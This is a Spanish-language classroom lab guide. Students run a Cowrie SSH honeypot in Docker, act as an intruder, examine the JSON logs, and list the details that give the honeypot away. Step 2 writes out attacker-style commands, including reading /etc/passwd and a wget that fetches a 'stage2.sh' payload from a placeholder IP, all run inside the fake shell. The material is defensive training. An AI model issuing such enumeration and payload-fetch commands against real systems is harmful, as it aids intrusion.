# E1 · Armá tu laboratorio y rompelo — guía de ejecución

**Primera parte · sobre el honeypot · 10 minutos · grupos de 2-3**

Esta guía es el paso a paso para correr el ejercicio sin perder tiempo.

---

## El reloj

| Min | Paso | Qué tiene que quedar |
|---|---|---|
| 0-2 | 1 · Levantar el laboratorio | `cowrie` y `opencanary` en `running` |
| 2-4 | 2 · Entrar como adversario | Una sesión SSH con los comandos de enumeración |
| 4-5 | 3 · Mirar lo que produjo | El número de eventos de tu sesión |
| 5-9 | **4 · Rompelo** | Al menos cuatro delatores, cada uno con su corrección |
| 9-10 | Cierre | Exportar y mandar al chat del grupo |

> **La mitad del tiempo es romperlo.** Diez minutos alcanzan solo si llegás con el
> laboratorio **ya construido**: la primera construcción sola tarda dos o tres
> minutos. Si a los dos minutos no está corriendo, sumate a la máquina de otro
> integrante: no dejes que la instalación se coma el «rompelo».

---

## Antes de empezar

- **Docker** instalado y corriendo (`docker info` responde sin error).
- El repositorio clonado. Si ya abriste las guías, ya lo tenés.
- **El laboratorio construido antes de la clase**: corré una vez
  `docker compose up -d --build` desde `mi-lab/` en tu casa. En el aula solo se
  levanta.
- Dos terminales abiertas en `mi-lab/`: una para el host y otra para el shell falso.
- `jq` es opcional. En Windows se reemplaza con `ConvertFrom-Json` de PowerShell.

Todos los comandos se corren desde **`mi-lab/`**, salvo que se diga otra cosa.

---

## 1 · Levantá el laboratorio · 0-2 min

```bash
git clone https://github.com/Base4Security/eko2026-active-defense-labs   # si no lo tenés
cd eko2026-active-defense-labs/mi-lab

docker compose up -d --build
docker compose ps
```

**Listo cuando** `cowrie` y `opencanary` aparecen en `running`.

Si no tenés internet: `docker load -i b4-lab-kit.tar`. El `.tar` se descarga de
las [releases del repositorio](https://github.com/Base4Security/eko2026-active-defense-labs/releases).

Comprobación rápida, opcional:

```bash
nc -z localhost 2222 && echo ssh-ok
```

```powershell
# Windows · PowerShell
Test-NetConnection localhost -Port 2222
```

> La primera vez Cowrie tarda un poco más porque genera sus claves SSH. Pasa una
> sola vez.

---

## 2 · Entrá como entraría un adversario · 2-4 min

En la **segunda terminal**:

```bash
ssh root@localhost -p 2222
```

Cualquier contraseña funciona. Una vez adentro, enumerá como alguien que acaba de
conseguir acceso y todavía no sabe dónde cayó:

```bash
uname -a
cat /etc/passwd
ls -la /home
wget http://198.51.100.10/stage2.sh    # no resuelve: lo que importa es el intento
exit
```

**Tipealos uno por uno**, no pegues el bloque entero: así se comporta un adversario
de verdad, y así vas a ver cómo responde cada comando.

> Todo lo que tipeás adentro del shell falso corre en el contenedor Linux, no en
> tu máquina. Vale igual para Windows.

---

## 3 · Mirá lo que produjo · 4-5 min

De vuelta en la **terminal del host**:

```bash
# JSON estructurado, un evento por línea
tail -20 cowrie/log/cowrie.json

# solo login y comandos (si tenés jq)
jq -c 'select(.eventid|test("login|command")) | {eventid,src_ip,username,input}' \
  cowrie/log/cowrie.json

# por tipo de evento
jq -r .eventid cowrie/log/cowrie.json | sort | uniq -c | sort -rn

# cuántos eventos produjo tu sesión
wc -l < cowrie/log/cowrie.json
```

```powershell
# Windows · PowerShell
Get-Content cowrie\log\cowrie.json -Tail 20

Get-Content cowrie\log\cowrie.json | ConvertFrom-Json |
  Where-Object { $_.eventid -match 'login|command' } |
  Select-Object eventid, src_ip, username, input

Get-Content cowrie\log\cowrie.json | ConvertFrom-Json |
  Group-Object eventid | Sort-Object Count -Descending | Select-Object Count, Name

(Get-Content cowrie\log\cowrie.json).Count
```

**Anotá el número en la ficha.** Si repetiste la sesión, contá solo la tuya o
aclaralo.

Mientras mirás el archivo, respondé estas dos preguntas:

1. ¿Hay algún evento de **fallo** que no corresponda a nada que hayas hecho mal?
   ¿De dónde sale?
2. ¿Qué eventos hablan de lo que el adversario **hizo**, y cuáles de **con qué
   vino**?

### Por qué se lee desde el host

La imagen de Cowrie es **distroless**: no trae `sh`, `cat` ni `tail`. Por eso
`docker compose exec cowrie ...` falla con:

```
OCI runtime exec failed: exec: "sh": executable file not found in $PATH
```

No es un error tuyo. El JSON llega al host por el bind mount de
`docker-compose.yml`, y por eso **sobrevive a un `docker compose down`**. El E7
necesita ese archivo.

> **Si te dan 4 o 5 eventos**, estás mirando `docker compose logs` y no el JSON.
> Andá a `cowrie/log/cowrie.json`.

---

## 4 · Rompelo · 5-9 min

Cuatro minutos para buscar qué delata al honeypot ante alguien atento. Viene **sin
configurar a propósito** y se cae rápido.

Buscá en cinco frentes:

| Frente | Pregunta |
|---|---|
| **Banner** | ¿Lo que anuncia el servidor SSH cierra con lo que hay del otro lado? |
| **Hostname** | ¿Encaja con la convención de nombres de EkoFinance que viste en el caso? |
| **Filesystem** | ¿Los usuarios, los directorios y el contenido parecen de un banco argentino? |
| **Comandos** | ¿Algún comando responde como **no podría responder** un Linux real? |
| **Fechas** | ¿La máquina tiene pasado? ¿Las fechas son coherentes con la historia que cuenta? |

Por dónde empezar:

```bash
# desde el host
ssh -v root@localhost -p 2222 2>&1 | grep -i "remote software"
docker inspect b4-cowrie --format '{{.Created}} · {{.Config.Image}}'
```

```powershell
# Windows · PowerShell
ssh -v root@localhost -p 2222 2>&1 | Select-String "remote software"
docker inspect b4-cowrie --format '{{.Created}} · {{.Config.Image}}'
```

```bash
# adentro del shell falso
hostname ; uname -a ; ls -la /home ; last ; uptime ; df -h ; ps aux
```

Algunas ideas para ir más allá de la lista:

- Usá los comandos **como los escribís siempre**, con los flags de costumbre.
  Los honeypots rara vez fallan en lo que muestran: fallan en **cómo se rompen**.
- Combiná señales. Un indicio aislado puede tener una explicación inocente;
  tres juntos ya no.
- Si te sobra tiempo, compará la negociación SSH (`ssh -vv`) contra un OpenSSH
  real y fijate si coincide con lo que dice el banner.

### Cómo anotar cada delator

Una fila por delator en la ficha, con tres columnas:

| Qué lo delata | Cómo lo viste | Qué habría que cambiar |
|---|---|---|
| Qué observaste | El comando exacto y su salida | Una acción que se pueda **ejecutar** |

La tercera columna es la que vas a **correr en el E5**, así que tiene que ser
concreta:

| ❌ No sirve | ✅ Sirve |
|---|---|
| «El banner es viejo» | «`cowrie.cfg` → `version = SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13`» |
| «Mejorar el realismo» | Qué archivo, qué línea y qué valor |
| «Arreglar el comando X» | «Sacarlo del filesystem falso» o «parchear el comando emulado» |

Una corrección que no se puede ejecutar es una fila que en el E5 no sirve.

> **`cowrie/etc/cowrie.cfg` ya existe y no arregla nada.** Solo fija cómo se
> escribe el log (`logtype = plain`). No lo borres: en el E5 escribís tus
> correcciones ahí abajo.

---

## Cierre · 9-10 min

1. Revisá el **control de avance** de la ficha: seis casillas marcadas.
2. Apretá **Exportar** y mandá el Markdown al chat del grupo. El trabajo se
   guarda en el navegador de *esa* máquina, y el E5 arranca con esa lista.
3. **No bajes el laboratorio.** Si necesitás pausarlo, usá `docker compose stop`.

---

## Entregable → E5 y E14

- La **lista de delatores** (mínimo cuatro), cada uno con el comando que lo
  revela y su corrección concreta.
- El **número de eventos** que produjo tu sesión.

```
E1 lista de delatores ──► E5  los arreglás y medís el antes y el después
E1 cowrie.json        ──► E7  cazás sobre tus propios logs
E5 honeypot endurecido ─► E14 otro grupo intenta quemarlo
```

---

## Si algo falla

| Síntoma | Causa | Qué hacer |
|---|---|---|
| `docker compose exec cowrie ...` da `executable file not found` | La imagen es distroless | Leé el JSON desde el host (paso 3) |
| El SSH autentica y queda colgado | Alguien tocó los volúmenes de Cowrie en el compose | Volvé al `docker-compose.yml` original y levantá de nuevo |
| `cowrie/log/cowrie.json` no existe o no crece | El plugin de log no arrancó | Revisá que `cowrie/etc/cowrie.cfg` siga con `logtype = plain` y hacé `docker compose restart cowrie` |
| Warning de *host key changed* al volver a entrar | Se borró el volumen con `down -v` | `ssh-keygen -R "[localhost]:2222"` y volvé a entrar. Usá `down` sin `-v` |
| El puerto 2222 está ocupado | Otro laboratorio o servicio | Cambiá el mapeo en `docker-compose.yml` (por ejemplo `"2223:2222"`) |
| Un solo `wc -l` da muchos más eventos que los tuyos | El archivo acumula todas las sesiones | Contá solo la tuya por `session`, o anotá el antes y el después |
| No hay Docker en la máquina | — | Sumate a la máquina de otro integrante desde el minuto cero |

```powershell
# Windows · quitar la host key vieja
ssh-keygen -R "[localhost]:2222"
```

> **Ojo con `docker compose down -v`.** El `-v` borra el volumen donde Cowrie
> guarda sus claves, y el honeypot aparece con otra identidad. El `down` pelado
> no lo toca, y el JSON sobrevive a los dos.
